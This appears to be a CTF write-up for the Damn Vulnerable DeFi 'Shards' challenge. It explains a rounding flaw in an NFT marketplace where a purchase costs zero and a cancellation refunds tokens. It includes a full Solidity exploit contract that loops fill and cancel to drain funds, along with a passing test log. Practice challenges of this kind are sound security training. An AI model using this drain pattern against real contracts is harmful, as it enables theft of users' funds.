# Damn Vulnerable Defi - Shards
- Scope
    - ShardsNFTMarketplace.sol  
    - ShardsFeeVault.sol  
    - IShardsNFTMarketplace.sol  
    - DamnValuableStaking.sol  
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

### Vulnerability Details
1. `want.mulDivDown()` calculation is 0, hence we pay 0 to get a shard
2. When we `cancel()` our free shard, we get back 75e11 tokens
```diff
function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
        Offer storage offer = offers[offerId];
        if (want == 0) revert BadAmount();
        if (offer.price == 0) revert UnknownOffer();
        if (want > offer.stock) revert OutOfStock();
        if (!offer.isOpen) revert NotOpened(offerId);

        offer.stock -= want;
        purchaseIndex = purchases[offerId].length;
        uint256 _currentRate = rate;
        purchases[offerId].push(
            Purchase({
                shards: want,
                rate: _currentRate,
                buyer: msg.sender,
                timestamp: uint64(block.timestamp),
                cancelled: false
            })
        );
        paymentToken.transferFrom(
-            msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
        );
        if (offer.stock == 0) _closeOffer(offerId);
    }

function cancel(uint64 offerId, uint256 purchaseIndex) external {
        Offer storage offer = offers[offerId];
        Purchase storage purchase = purchases[offerId][purchaseIndex];
        address buyer = purchase.buyer;

        if (msg.sender != buyer) revert NotAllowed();
        if (!offer.isOpen) revert NotOpened(offerId);
        if (purchase.cancelled) revert AlreadyCancelled();
        if (
            purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
                || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
        ) revert BadTime();

        offer.stock += purchase.shards;
        assert(offer.stock <= offer.totalShards); // invariant
        purchase.cancelled = true;

        emit Cancelled(offerId, purchaseIndex);

        console.log("purchaseRate: ", purchase.rate);
        console.log("purchaseShards:", purchase.shards);
        
+        paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
    }
```

### Impact/Proof of Concept
1. In this challenge, we require to drain at least 75e15 tokens from Marketplace
2. Hence, each `fill()` and `cancel()` will yield us 75e11 tokens, so we need to repeat this 10000 more times to achieve 75e15 tokens drained from Marketplace

```diff
contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        uint256 wantShards = 100; // Fill 100 shards per call
        uint64 offerId = 1;

        // Loop 10 times to execute fill(1, 100)
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

Results
```diff
[PASS] test_shards() (gas: 823037323)
Logs:
  recovery balance: 75
```
